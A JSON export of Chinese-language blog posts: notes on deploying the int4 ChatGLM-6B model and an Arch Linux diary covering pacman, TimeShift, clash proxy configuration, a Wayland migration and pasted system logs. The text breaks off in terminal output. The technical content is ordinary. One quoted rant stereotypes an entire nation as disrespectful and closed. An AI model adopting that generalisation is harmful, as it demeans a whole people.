{"posts":[{"title":"ChatGLM部署手记","text":"这次部署了一次量化后的模型，大概记录一下部署过程和遇到的问题。 因为显卡显存只有8G，所以部署的是6b的int4量化模型。 部署一般是直接从Hugging Face克隆仓库下来。我当时担心速度不够从清华云盘下载的，不过后来克隆发现速度很快，一般应该是不用担心下载速度的。 首先克隆6b的仓库，然后进入仓库安装依赖： 12git clone https://github.com/THUDM/ChatGLM-6B &amp;&amp; cd ChatGLM-6Bpip install -r requirements.txt 然后下载ChatGLM-6B的模型的量化版本。注意，一定要下载所有的文件。如果clone不下来，就先把其他小文件下下来，然后在清华网盘下载模型本体： 12git clone https://huggingface.co/THUDM/chatglm-6b-int4# 量化版本地址：https://cloud.tsinghua.edu.cn/d/674208019e314311ab5c/ 完成后，更改cli-demo.py和webui-demo.py中的THUDM/chatglm-6b-int4为你本地的路径：/path/to/chatglm-6b-int4即可。 最后，使用python运行即可： 1python3 webui-demo.py 问题如果报错的话，可能是缺少 tokenizer 的相关文件：tokenizer_config.json、special_tokens_map.json、tokenization_chatglm.py 和 ice_text.model。将这些文件（位于你下载的模型的目录中）补全即可解决。","link":"/2023/08/22/ChatGLM%E9%83%A8%E7%BD%B2%E6%89%8B%E8%AE%B0/"},{"title":"Arch Linux折腾笔记","text":"安装参考 Arch Wiki 或者参考这个简化版教程：https://arch.icekylin.online/。过程按照教程一步步折腾就ok，只要注意区分清楚各个分区，别不小心把数据分区给格式化了就行。联网是安装Arch的必须项，所以请保持网络畅通。另外，建议安装镜像最好在安装完成后继续保留着，应急情况下（比如滚挂了）可以用arch-chroot来应急重装内核之类的。 至于Arch经常被吐槽滚挂了的原因，主要是源自Arch的更新策略比较激进，更新完成后，会直接删除老内核，比起一般的更新策略更容易出现依赖问题造成“滚挂了“。 桌面环境、cn源、透明代理之类的配置，也可以参考上面的教程。关于透明代理，也可以参考这篇文章。 Tips 为了使用timeshift恢复时正常启动，建议删除/etc/fstab里的subvolid部分：sudo sed -i -E 's/(subvolid=[0-9]+,)|(,subvolid=[0-9]+)//g' /etc/fstab 美化这点上因人而异。我装了layan主题之后，再换个壁纸，装个latte就差不多了。我的原则是，美化差不多就行，但是前提是别影响到系统性能。 稍微详细点首先是图标主题，这两个我是Tela+Layan；其次是上下两个任务栏，都设置了： Alignment-Center Width-Fill width/Center Opacity-Translucent Style-Floating 上面的任务栏用spacer分为了三段，左边单独一个Global Menu，中间一堆仪表盘，右边System Tray；下面的部分，用Latte Seperator分割三段，左边Application Dashbaord，中间Icons-only Task Manager，右边PlasMusic Toolbar。 壁纸可以用静态壁纸，也可以用视频当视频壁纸。 完成之后效果应该不错。 显示适配单显示器的配置很简单，改下dpi缩放就基本ok。如果是多显示器的话，就会复杂一些。参考下面的公式： 123# 假设HiDPI显示器的分辨率是AxB，普通分辨率显示器的分辨率是CxD # 并且外置显示器的缩放比率是ExFxrandr --output eDP-1 --auto --output HDMI-1 --auto --panning [C*E]x[D*F]+[A]+0 --scale [E]x[F] --right-of eDP-1 根据上面的公式来设置，基本上能搞定。当然，如果想调整的是内置HiDPI显示器分辨率，就得调整最后panning的A为Ax[A的缩放比率]。 参考链接 Barry的笔记 [2] X11 多显示器配置：玩转 XRandR pacman入门问了问GPT，大概做了下笔记如下： 123456789sudo pacman -Sy # 更新软件包数据库sudo pacman -S package_name # 安装软件包，可批量安装sudo pacman -R package_name # 删除软件包但保留配置sudo pacman -Rn package_name # 删除包和配置sudo pacman -Syu # 升级所有已安装的包sudo pacman -Sc # 清理pacman缓存的旧包sudo pacman -Ss search_term # 查找软件包sudo pacman -Si package_name # 查找软件包信息sudo pacman -Rns $(pacman -Qdtq) # 删除未使用依赖包 另外，Syu和Syyu的区别在于后者强制刷新了软件仓库缓存。后者虽然更新比较及时，但是用得多对于软件源仓库并不友好，而且浪费资源，不宜过于频繁使用。 最底下那个移除孤儿包的操作少用，用的时候手动确认是否包括重要依赖。 另外还有个操作，就是完整备份安装过的包列表，然后在新的系统上重新安装，这个用pacman可以做到。 12pacman -Qqe &gt; installed_packages.txt # 备份当前系统上所有已经明确安装的包sudo pacman -S --needed - &lt; installed_packages.txt # 只安装其中没有安装过的包 不过使用这个操作的时候，记得得保证清单的实时性，因为arch滚动更新，系统一直是新的，备份列表太久没更新的话在新系统上安装会有依赖，兼容等等问题。 启用外部ssh连接如果想从外部连接到Arch的电脑上，只要安装了openssh就行。Arch默认不会启动sshd，所以我们得手动开启： 1systemctl start sshd 在命令行连接Wi-Fi在完成安装后，启动NetworkManager： 1sudo systemctl enable --now NetworkManager 然后使用nmcli来连接Wi-Fi： 123nmcli dev wifi list# 后面的password部分不指定的话，会自动要求输入nmcli dev wifi connect &quot;SSID&quot; password &quot;password&quot; 使用TimeShift备份系统TimeShift是一个很好用的系统备份软件，特别是结合了btrfs之后，备份的体积比借助rsync时更小。 折腾系统时不时可能滚挂，这种时候有个定期创建的映像就很有用了。 12sudo timeshift --list # 获取快照列表sudo timeshift --restore --snapshot '20XX-XX-XX_XX-XX-XX' --skip-grub # 选择一个快照进行还原，并跳过 GRUB 安装，一般来说 GRUB 不需要重新安装 如果恢复后无法使用，用安装盘通过arch-chroot进去系统，然后手动更改subvolid来手动修复，或者直接删除subvolid： 1234# 获取subvolidsudo btrfs sub list -u /# 编辑,根据自己情况，修复vim /etc/fstab 重启显示管理器（Xorg/Wayland）1sudo systemctl restart display-manager Vim装上Arch之后我很快就把Vim装上了。结果发现没法和系统剪贴板联动。在Vim里边检查has(clipboard)之后发现，好像这个Vim不支持剪贴板。 解决方法：装gvim：sudo pacman -S gvim。会提示你是否卸载Vim，选是，配置不会删除所以放心删。安装完了之后你就会发现Vim还能用，而且剪贴板功能好了： 桌面目录映射今天看到群里一个老哥家目录下的文件都堆到桌面了，顺便了解了一下关于桌面目录映射的问题。因为有时候中文模式创建的家目录下的文件夹都是中文，那个老哥就是改成英文目录的时候遇到了这个问题。 XDG_DESKTOP_DIR这个环境变量的介绍，在archWiki上也能翻到。 XDG_DESKTOP_DIR是一个环境变量，用于指定用户的桌面文件夹的位置。它是XDG Base Directory规范1的一部分，该规范定义了一些标准的用户目录，如音乐、图片、下载等，以及一些用于存储配置、缓存、数据和状态的目录。XDG_DESKTOP_DIR的默认值是$HOME/Desktop，但用户可以通过编辑~/.config/user-dirs.dirs文件或使用xdg-user-dirs-update命令来修改它2。 KDE桌面环境遵循XDG Base Directory规范，并使用XDG_DESKTOP_DIR变量来确定桌面文件夹的位置。如果用户更改了XDG_DESKTOP_DIR的值，KDE会自动更新桌面设置，并将桌面文件夹更改为新的位置。这样，用户可以灵活地管理自己的桌面文件夹，而不影响其他应用程序或桌面环境3。 所以出问题的话看看.config底下配置炸没炸就行。 添加多系统启动项在安装Arch的时候，会发现中间有一步是sudo vim /etc/default/grub然后grub-mkconfig -o /boot/grub/grub.cfg。这一步就是先编辑grub的配置，然后生成grub文件到/boot/grub/下的配置文件中。因此，我们如果突然心血来潮想装个Windows玩玩谁装啊，就可以改改grub配置让它为我们添加启动项。 因为最终的配置项是由grub-mkconfig生成的，所以并不推荐直接修改这个文件。更好的做法是安装os-prober，然后挂载其他系统的分区，并编辑grub配置文件启用os探测，最后再用grub-mkconfig生成新的grub启动项文件。 至于为啥grub现在默认禁用掉了os-prober，注释里边说的是因为安全问题所以禁用掉了。 代理配置既然都上Arch了，那代理软件不得整个自由点的？直接扔了cfw，拥抱clash-core。具体配置教程参考这篇，我给个简洁版的： 12345678910111213141516171819202122232425262728293031323334353637383940# 实在懒得sudo了# 不过记得看清命令再回车sudo supacman -S clashmkdir -p /etc/clash# 然后从provider那里下载yaml配置文件# 假设文件名为config.yamlmv ./config.yaml /etc/clash/# 设置控制面板路径# 我这里的控制面板路径在/etc/clash/clash-dashboardecho 'external-ui: clash-dashboard' &gt;&gt; /etc/clash/config.yaml# 配置环境变量，配完了记得重启/重新登陆一下cat &lt;&lt; EOF &gt;&gt; /etc/environmenthttps_proxy=http://127.0.0.1:7890http_proxy=http://127.0.0.1:7890all_proxy=http://127.0.0.1:7890EOF# 配置systemd服务项# 配完了就能开机自启动了哦cat &lt;&lt; EOF &gt; /etc/systemd/system/clash.service[Unit]Description=Clash daemon, A rule-based proxy in Go.After=network.target[Service]Type=simpleRestart=alwaysExecStart=/usr/bin/clash -d /etc/clash # /usr/bin/clash 为绝对路径，请根据你实际情况修改[Install]WantedBy=multi-user.targetEOF################ clash，启动！###############systemctl enable --now clash.service 里边比较重要的一步是配置环境变量env，上回配置的时候忘了加http前缀，结果系统里边啥玩意都不认我的代理设置。 哦对，配置完成之后还得在系统里边设置好代理： 悲：cfw跑路之后clash-core也跑路了然后所有client都跑路了为clash家族 + 1s以及我的评价是：以及某作者的睿频：最适合这个民族的其实是一群小白围着大大转，大大通过小白的夸奖获得自我满足，然后小白的吃喝拉撒都包给大大解决的模式。通过这个项目我感觉我已经彻底认识到这个民族的前面为什么会有一堵墙了。没有墙哪来的大大。所以到处都是什么附件回帖可见，等级多少用户组可见，一个论坛一个大大供小白跪舔，不需要政府造墙，网民也会自发造墙。这尼玛连做个翻墙软件都要造墙，真是令人叹为观止。这是一个造了几干年墙的保守的农耕民族，缺乏对别人的基本尊重，不愿意分享，喜欢遮遮掩掩，喜欢小圈子抱团，大概这些传统是改不掉了吧。 另外还有一个，就是切换节点必须得使用clash的控制端口（在config.yaml中给出，一般是9090），所以还必须得有个控制面板。一般Windows平台都是用已经似了的Clash For Windows作为控制面板的，而Linux这边使用https://clash.razord.top/也就是也已经似了的Clash的官方控制面板作为控制面板的。实在不行了可以用命令行下的TUI工具clashctl来手动切换节点，应该也能用。 eXtended：通过RESTfulAPI操作clash-core研究一下clash-dashboard和clash的源代码就能看得出来了。其他的我就不说了，这里只说最常用的几个操作： 节点列表 GET http://localhost:9097/providers/proxies 切换节点 PUT http://localhost:9097/proxies/组名 name=节点名 测速 GET http://localhost:9097/proxies/节点名/delay Clash版本 GET http://localhost:9097/version 一个简单的cli实现： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/bin/bashBASE_URL=&quot;http://localhost:9097&quot;get_proxies() { curl -s &quot;${BASE_URL}/providers/proxies&quot; | jq .}switch_proxy() { local group_name=$1 local node_name=$2 curl -s -X PUT -d &quot;name=${node_name}&quot; &quot;${BASE_URL}/proxies/${group_name}&quot; | jq .}get_delay() { local node_name=$1 curl -s &quot;${BASE_URL}/proxies/${node_name}/delay&quot; | jq .}get_clash_version() { curl -s &quot;${BASE_URL}/version&quot;}case &quot;$1&quot; in list) get_proxies ;; switch) if [[ -z &quot;$2&quot; || -z &quot;$3&quot; ]]; then echo &quot;Usage: $0 switch &lt;group_name&gt; &lt;node_name&gt;&quot; exit 1 fi switch_proxy &quot;$2&quot; &quot;$3&quot; ;; delay) if [[ -z &quot;$2&quot; ]]; then echo &quot;Usage: $0 delay &lt;node_name&gt;&quot; exit 1 fi get_delay &quot;$2&quot; ;; version) get_clash_version ;; *) echo &quot;Usage: $0 {list|switch|delay|version}&quot; exit 1 ;;esac FAQ:常见代理连接失败问题 检查本机时间是否同步：sudo timedatectl set-ntp true 检查ISP提供的配置文件是否失效 检查本地互联网连接 RDP连接Windows用Arch多了，有时候得偶尔远程一下Windows。配置了半天Remmina+freerdp，可能这玩意和我风水不合吧，半天跑不起来。遂尝试了下rdesktop，秒连（也不知道为啥）： 12sudo pacman -S rdesktoprdesktop 114.5.1.4 然后输账号密码登陆就行了。因为暂时这样就够用所以就没咋折腾。 scrcpy连接android123sudo pacman -S scrcpyadb connect 114.5.1.4:1919scrcpy 测试延迟相当低，比各家的流转效果都好。支持键盘和鼠标输入。 X11迁移Wayland主要动机：支持一下双屏不同缩放的功能，不然一个高分屏+一个普通1080p的组合太痛苦了。 123456pacman -Qi wayland # 已安装则继续，否则安装sudo pacman -S --needed waylandyay -S sddm-git # 必须得是sddm-git，其他版本好像没完善的Wayland支持pacman -S --needed xorg-xwayland xorg-xlsclients qt5-wayland glfw-waylandpacman -S --needed plasma kde-applicationspacman -S --needed plasma-wayland-session 按照这里给出的流程，装完上面的包之后，Logout之后应该就能在左下角看到登陆Plasma(Wayland)的提示了。 你还能通过查看 $XDG_SESSION_TYPE 变量来 核实你是否在运行 Wayland。 先去装了，一会回来记录。 装完了，兼容性没啥大问题，我甚至没重启，只是重新登陆了下。就是latte-dock的图标缩放看着怪怪的，而且桌面小组件也乱飞了。以及，输入法好像不太对劲，在firefox以外的地方皮肤会丢失。 刚重新设置了下屏幕排列，现在能单独设置两块屏幕的缩放了，爽。就是高分屏看着有点糊，以及字体缩放问题，还有这个fcitx也不太对劲。 关于fcitx，系统给了一段报错： 1Fcitx should be launched by KWin under KDE Wayland in order to use Wayland input method frontend. This can improve the experience when using Fcitx on Wayland. To configure this, you need to go to &quot;System Settings&quot; -&gt; &quot;Virtual keyboard&quot; and select &quot;Fcitx 5&quot; from it. You may also need to disable tools that launches input method, such as imsettings on Fedora, or im-config on Debian/Ubuntu. For more details see https://fcitx-im.org/wiki/Using_Fcitx_5_on_Wayland#KDE_Plasma 先重启下看看吧。 草了，重启回来变回x11 seession了。找找默认值在哪保存着吧。 找到了，在/usr/lib/sddm/sddm.conf.d/default.conf里边，有一个DisplayServer=x11的项，把x11改为wayland应该就行了。重启看看。 好像不太行，而且现在切不过去Wayland了，坏。 把设置都改回去了，现在好像能进去了。但是还是默认进入x11的plasma桌面。 哎，把用户空间的那个sddm configuration改了一下，删了里边的[Autologin]底下的session=的值，重启下试试。以及又得到了一段关于fcitx的建议： 1Detect GTK_IM_MODULE and QT_IM_MODULE being set and Wayland Input method frontend is working. It is recommended to unset GTK_IM_MODULE and QT_IM_MODULE and use Wayland input method frontend instead. For more details see https://fcitx-im.org/wiki/Using_Fcitx_5_on_Wayland#KDE_Plasma 好好好搞定了。按照上面的设置先屏蔽了俩环境变量，然后删除了默认值，现在系统已经处于完全可用的状态。回头有时间了整理整理过程。 Fri 22 Dec 2023 05:14:55 PM CST 编辑：这个选项不用在命令行里修改，直接去系统设置里边的Startup nad shutdown-&gt;Login Screen-&gt;Behavior里边修改...with session = 的选项就行了。 又出问题了小笔记本上的arch的kde以至于其中的所有程序突然都变得特别卡。最奇怪的是这会的系统资源专用状况完全没有多高，CPU%，MEM37.4%的占用率应该很健康了吧。 觉得的卡顿是因为我发现就连tmux里边开个vim写文档都卡得不行了才觉得不对劲。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758systemd-+-NetworkManager |-bluetoothd |-clash |-dbus-daemon |-polkitd |-rtkit-daemon |-sddm-+-Xorg | `-sddm-helper---startplasma-x11 |-systemd-+-(sd-pam) | |-adb | |-agent | |-at-spi-bus-laun---dbus-daemon | |-at-spi2-registr | |-chrome_crashpad | |-dbus-daemon | |-dconf-service | |-fcitx5 | |-gmenudbusmenupr | |-gvfs-udisks2-vo | |-gvfsd-+-gvfsd-dnssd | | |-gvfsd-network | | `-gvfsd-trash | |-gvfsd-fuse | |-gvfsd-metadata | |-kaccess | |-kactivitymanage | |-kded5 | |-kglobalaccel5 | |-konsole---bash---tmux: client | |-krunner---qq-+-qq---qq | | |-qq---2*[qq] | | `-qq | |-kscreen_backend | |-ksmserver---DiscoverNotifie | |-ksystemstats | |-kwalletd5 | |-kwin_x11 | |-latte-dock | |-linuxqq | |-obexd | |-org_kde_powerde | |-pipewire | |-pipewire-media- | |-plasmashell---crow | |-polkit-kde-auth | |-pulseaudio---gsettings-helpe | |-tmux: server-+-2*[bash---vim] | | `-bash---sudo---sudo---pstree | |-2*[xdg-desktop-por] | |-xdg-document-po---fusermount3 | |-xdg-permission- | `-xembedsniproxy |-systemd-journal |-systemd-logind |-systemd-udevd |-udisksd |-upowerd `-wpa_supplicant 上面是sudo pstree -T的输出，感觉这种卡顿可能就是de内存溢出了。理论上我感觉只要重启一下sddm马上就能变流畅。但是在这之前我想知道更详细的信息。 先把qq关了试试。不出所料还是很卡。上google搜一下吧。 草了，看到一个哥们系统偶尔卡顿最后发现是SSD挂掉的前兆。想起来这个本子用的是三星的老固态，系统盘的文件系统是btrfs；前几天还看群里某群u吐槽说btrfs在他那边对于固态寿命损伤挺严重的。也不知道是不是btrfs的问题。不过好在重要数据都有备份，丢了也不心疼，全从服务器上sync下来就行了。 不过应该这次不是固态的问题，应该还是sddm本身的问题，不然很难解释怎么所有gui里边的东西都开始卡顿了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091TIME PID UID GID SIG COREFILE EXE SIZESun 2023-10-29 23:52:21 CST 2030 1000 1000 SIGBUS missing /chrome_crashpad_handler -Thu 2023-11-02 13:07:56 CST 3084 0 0 SIGABRT none /usr/bin/fcitx5-remote -Thu 2023-11-02 17:15:49 CST 36261 1000 1000 SIGABRT missing /usr/bin/clashctl -Thu 2023-11-02 23:44:53 CST 1795 1000 1000 SIGTRAP missing /tmp/.mount_linuxqFrCYKS/qq -Sat 2023-11-04 18:43:36 CST 1640 1000 1000 SIGABRT missing /usr/bin/clashctl -Sat 2023-11-04 18:45:41 CST 2255 0 0 SIGABRT none /usr/bin/fcitx5-remote -Sat 2023-11-04 18:46:34 CST 2300 0 0 SIGABRT none /usr/bin/fcitx5-remote -Sun 2023-11-05 18:16:28 CST 19274 1000 1000 SIGABRT missing /opt/vscodium-bin/codium -Sun 2023-11-05 18:16:30 CST 19330 1000 1000 SIGABRT missing /opt/vscodium-bin/codium -Sun 2023-11-05 22:13:13 CST 14279 1000 1000 SIGBUS missing /chrome_crashpad_handler -Thu 2023-11-09 23:30:51 CST 14724 1000 1000 SIGTRAP missing /qq -Thu 2023-11-09 23:38:16 CST 15804 1000 1000 SIGABRT missing /usr/bin/clashctl -Fri 2023-11-10 01:08:53 CST 14773 1000 1000 SIGBUS missing /chrome_crashpad_handler -Tue 2023-11-14 09:04:45 CST 5996 1000 1000 SIGABRT missing /usr/bin/clashctl -Tue 2023-11-14 09:47:58 CST 10033 1000 1000 SIGABRT missing /usr/bin/clashctl -Tue 2023-11-14 10:15:41 CST 75599 1000 1000 SIGABRT missing /usr/bin/clashctl -Tue 2023-11-14 10:30:25 CST 13990 1000 1000 SIGABRT missing /usr/bin/clashctl -Tue 2023-11-14 17:47:23 CST 575 1000 1000 SIGABRT missing /usr/bin/plasmashell -Tue 2023-11-14 21:00:24 CST 18347 1000 1000 SIGABRT missing /usr/bin/plasmashell -Wed 2023-11-15 00:34:08 CST 26489 1000 1000 SIGABRT missing /usr/bin/clashctl -Wed 2023-11-15 01:14:11 CST 28479 1000 1000 SIGABRT missing /usr/bin/clashctl -Wed 2023-11-15 11:34:37 CST 19955 1000 1000 SIGSEGV missing /usr/bin/plasmashell -Wed 2023-11-15 23:54:02 CST 36282 1000 1000 SIGSEGV missing /opt/visual-studio-code/code -Fri 2023-11-17 00:45:55 CST 16467 1000 1000 SIGBUS missing /chrome_crashpad_handler -Fri 2023-11-17 00:45:56 CST 40168 1000 1000 SIGTRAP missing /qq -Sat 2023-11-18 01:12:06 CST 17969 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:12:06 CST 15257 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:12:06 CST 17286 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:12:56 CST 19088 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:12:56 CST 19770 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:12:56 CST 18906 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:12:56 CST 19731 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:12:56 CST 19689 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:12:57 CST 19591 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:13:10 CST 25066 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:13:11 CST 25053 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:13:11 CST 20320 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:13:11 CST 24308 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:13:13 CST 25240 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:13:13 CST 25205 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 01:13:14 CST 25646 1000 1000 SIGABRT missing /usr/bin/ccze -Sat 2023-11-18 22:14:12 CST 576 1000 1000 SIGABRT missing /usr/bin/plasmashell -Sat 2023-11-18 23:37:15 CST 2175 1000 1000 SIGABRT missing /usr/bin/plasmashell -Sun 2023-11-19 12:59:47 CST 4430 0 0 SIGABRT none /usr/bin/fcitx5-remote -Sun 2023-11-19 13:00:33 CST 4459 0 0 SIGABRT none /usr/bin/fcitx5-remote -Sun 2023-11-19 13:00:34 CST 4469 0 0 SIGABRT none /usr/bin/fcitx5-remote -Sun 2023-11-19 13:06:05 CST 5821 0 0 SIGABRT none /usr/bin/fcitx5-remote -Mon 2023-11-20 20:53:13 CST 588 1000 1000 SIGSEGV missing /usr/bin/plasmashell -Mon 2023-11-20 20:56:33 CST 6077 1000 1000 SIGABRT missing /usr/bin/clashctl -Mon 2023-11-20 22:56:05 CST 5427 1000 1000 SIGABRT missing /usr/bin/plasmashell -Mon 2023-11-20 22:59:54 CST 18385 0 0 SIGABRT none /usr/bin/fcitx5-remote -Tue 2023-11-21 23:30:23 CST 12137 1000 1000 SIGBUS missing /qq -Tue 2023-11-21 23:30:25 CST 12093 1000 1000 SIGBUS missing /qq -Tue 2023-11-21 23:30:26 CST 17572 1000 1000 SIGBUS missing /qq -Tue 2023-11-21 23:30:26 CST 12015 1000 1000 SIGBUS missing /qq -Tue 2023-11-21 23:30:26 CST 12016 1000 1000 SIGBUS missing /qq -Tue 2023-11-21 23:30:27 CST 12459 1000 1000 SIGBUS missing /qq -Tue 2023-11-21 23:30:27 CST 12003 1000 1000 SIGBUS missing /qq -Tue 2023-11-21 23:30:28 CST 12043 1000 1000 SIGBUS missing /chrome_crashpad_handler -Fri 2023-11-24 00:01:53 CST 14600 1000 1000 SIGBUS missing /chrome_crashpad_handler -Sat 2023-11-25 02:40:58 CST 32138 1000 1000 SIGBUS missing /chrome_crashpad_handler -Tue 2023-11-28 23:33:11 CST 41077 1000 1000 SIGTRAP missing /qq -Wed 2023-11-29 11:43:44 CST 43973 1000 1000 SIGABRT missing /usr/bin/adb -Wed 2023-11-29 11:44:06 CST 45189 1000 1000 SIGABRT missing /usr/bin/adb -Wed 2023-11-29 23:29:56 CST 53151 1000 1000 SIGABRT missing /usr/bin/clashctl -Wed 2023-11-29 23:45:58 CST 55228 1000 1000 SIGSEGV missing /opt/visual-studio-code/code -Thu 2023-11-30 00:13:43 CST 42637 1000 1000 SIGBUS missing /chrome_crashpad_handler -Sat 2023-12-02 01:12:16 CST 56991 1000 1000 SIGBUS missing /chrome_crashpad_handler -Mon 2023-12-04 10:28:09 CST 77126 1000 1000 SIGABRT missing /usr/bin/clashctl -Mon 2023-12-04 15:18:23 CST 99034 0 0 SIGABRT none /usr/bin/fcitx5-remote -Mon 2023-12-04 15:19:05 CST 99068 0 0 SIGABRT none /usr/bin/fcitx5-remote -Mon 2023-12-04 15:20:45 CST 99231 0 0 SIGABRT none /usr/bin/fcitx5-remote -Mon 2023-12-04 15:54:13 CST 104472 1000 1000 SIGSEGV missing /home/xeonds/code/pizip/pi -Mon 2023-12-04 15:54:45 CST 104495 1000 1000 SIGSEGV missing /home/xeonds/code/pizip/pi -Mon 2023-12-04 15:55:06 CST 104521 1000 1000 SIGSEGV missing /home/xeonds/code/pizip/pi -Mon 2023-12-04 15:55:36 CST 104541 1000 1000 SIGSEGV missing /home/xeonds/code/pizip/pi -Mon 2023-12-04 17:28:20 CST 104920 1000 1000 SIGBUS missing /chrome_crashpad_handler -Mon 2023-12-04 23:36:35 CST 119295 1000 1000 SIGSEGV missing /opt/visual-studio-code/code -Wed 2023-12-06 11:18:53 CST 16426 0 0 SIGABRT none /usr/bin/fcitx5-remote -Mon 2023-12-11 19:56:40 CST 97572 1000 1000 SIGTRAP missing /tmp/.mount_linuxqSV6RFp/qq -Tue 2023-12-12 01:01:33 CST 123670 1000 1000 SIGTRAP missing /opt/visual-studio-code/code -Fri 2023-12-15 14:50:41 CST 17039 1000 1000 SIGTRAP missing /tmp/.mount_linuxqkQn53G/qq -Sat 2023-12-16 23:55:13 CST 19892 1000 1000 SIGTRAP missing /opt/visual-studio-code/code -Mon 2023-12-18 13:16:16 CST 28074 0 0 SIGABRT none /usr/bin/fcitx5-remote -Mon 2023-12-18 15:08:22 CST 41701 1000 1000 SIGABRT missing /usr/bin/clashctl -Tue 2023-12-19 21:37:06 CST 17530 1000 1000 SIGFPE missing /home/xeonds/code/c4/a.out -Tue 2023-12-19 23:39:47 CST 20684 1000 1000 SIGTRAP missing /tmp/.mount_linuxqllS3Xz/qq -Wed 2023-12-20 12:31:27 CST 23806 1000 1000 SIGABRT missing /usr/bin/clashctl -Sun 2023-12-24 19:26:26 CST 5873 1000 1000 SIGTRAP present /qq 1.6MMon 2023-12-25 01:59:52 CST 5951 1000 1000 SIGBUS present /chrome_crashpad_handler 42.5K 上面是coredumpctl的输出。好像sddm还没崩溃呢。再看看journal： 12345678910111213141516171819202122232425262728293031323334353637383940Dec 24 02:28:08 ark-station-breeze systemd[1]: Started Simple Desktop Display Manager.░░ Subject: A start job for unit sddm.service has finished successfully░░ Defined-By: systemd░░ Support: https://lists.freedesktop.org/mailman/listinfo/systemd-devel░░ ░░ A start job for unit sddm.service has finished successfully.░░ ░░ The job identifier is 108.Dec 24 02:28:08 ark-station-breeze sddm[407]: Initializing...Dec 24 02:28:08 ark-station-breeze sddm[407]: Starting...Dec 24 02:28:08 ark-station-breeze sddm[407]: Logind interface foundDec 24 02:28:08 ark-station-breeze sddm[407]: Adding new display...Dec 24 02:28:08 ark-station-breeze sddm[407]: Loaded empty theme configurationDec 24 02:28:08 ark-station-breeze sddm[407]: Xauthority path: &quot;/run/sddm/xauth_bDCTVn&quot;Dec 24 02:28:08 ark-station-breeze sddm[407]: Using VT 2Dec 24 02:28:08 ark-station-breeze sddm[407]: Display server starting...Dec 24 02:28:08 ark-station-breeze sddm[407]: Writing cookie to &quot;/run/sddm/xauth_bDCTVn&quot;Dec 24 02:28:08 ark-station-breeze sddm[407]: Running: /usr/bin/X -dpi 120 -background none -seat seat0 vt2 -auth /run/sddm/xauth_bDCTVn -noreset -displayfd 16Dec 24 02:28:09 ark-station-breeze sddm[407]: Setting default cursorDec 24 02:28:09 ark-station-breeze sddm[407]: Running display setup script &quot;/usr/share/sddm/scripts/Xsetup&quot;Dec 24 02:28:09 ark-station-breeze sddm[407]: Display server started.Dec 24 02:28:09 ark-station-breeze sddm[407]: Reading from &quot;/usr/local/share/xsessions/plasma.desktop&quot;Dec 24 02:28:09 ark-station-breeze sddm[407]: Reading from &quot;/usr/share/xsessions/plasma.desktop&quot;Dec 24 02:28:09 ark-station-breeze sddm[407]: Session &quot;/usr/share/xsessions/plasma.desktop&quot; selected, command: &quot;/usr/bin/startplasma-x11&quot; for VT 2Dec 24 02:28:09 ark-station-breeze sddm-helper[433]: [PAM] Starting...Dec 24 02:28:09 ark-station-breeze sddm-helper[433]: [PAM] Authenticating...Dec 24 02:28:09 ark-station-breeze sddm-helper[433]: pam_kwallet5(sddm-autologin:auth): pam_kwallet5: pam_sm_authenticateDec 24 02:28:09 ark-station-breeze sddm-helper[433]: [PAM] Preparing to converse...Dec 24 02:28:09 ark-station-breeze sddm-helper[433]: pam_kwallet5(sddm-autologin:auth): pam_kwallet5: Couldn't get password (it is empty)Dec 24 02:28:09 ark-station-breeze sddm-helper[433]: [PAM] Conversation with 1 messagesDec 24 02:28:09 ark-station-breeze sddm-helper[433]: pam_kwallet5(sddm-autologin:auth): pam_kwallet5: Empty or missing password, doing nothingDec 24 02:28:09 ark-station-breeze sddm-helper[433]: [PAM] returning.Dec 24 02:28:09 ark-station-breeze sddm[407]: Authentication for user &quot;xeonds&quot; successfulDec 24 02:28:09 ark-station-breeze sddm-helper[433]: pam_kwallet5(sddm-autologin:setcred): pam_kwallet5: pam_sm_setcredDec 24 02:28:09 ark-station-breeze sddm-helper[433]: pam_unix(sddm-autologin:session): session opened for user xeonds(uid=1000) by xeonds(uid=0)Dec 24 02:28:10 ark-station-breeze sddm-helper[433]: pam_kwallet5(sddm-autologin:session): pam_kwallet5: pam_sm_open_sessionDec 24 02:28:10 ark-station-breeze sddm-helper[433]: pam_kwallet5(sddm-autologin:session): pam_kwallet5: open_session called without kwallet5_keyDec 24 02:28:10 ark-station-breeze sddm-helper[433]: Writing cookie to &quot;/tmp/xauth_XpVcsc&quot;Dec 24 02:28:10 ark-station-breeze sddm-helper[433]: Starting X11 session: &quot;&quot; &quot;/usr/share/sddm/scripts/Xsession \\&quot;/usr/bin/startplasma-x11\\&quot;&quot;Dec 24 02:28:10 ark-station-breeze sddm[407]: Session started true 哦还有xorg的： 1-- No entries -- 好吧空的。那看看top 1234567891011121314151617181920212223242526\u001b[?1h\u001b=\u001b[?25l\u001b[H\u001b[J\u001b[m\u000ftop - 15:10:25 up 1 day, 12:42, 1 user, load average: 1.40, 1.33, 1.29\u001b[m\u000f\u001b[39;49m\u001b[m\u000f\u001b[39;49m\u001b[K任务:\u001b[m\u000f\u001b[39;49m\u001b[1m 204 \u001b[m\u000f\u001b[39;49mtotal,\u001b[m\u000f\u001b[39;49m\u001b[1m 3 \u001b[m\u000f\u001b[39;49mrunning,\u001b[m\u000f\u001b[39;49m\u001b[1m 201 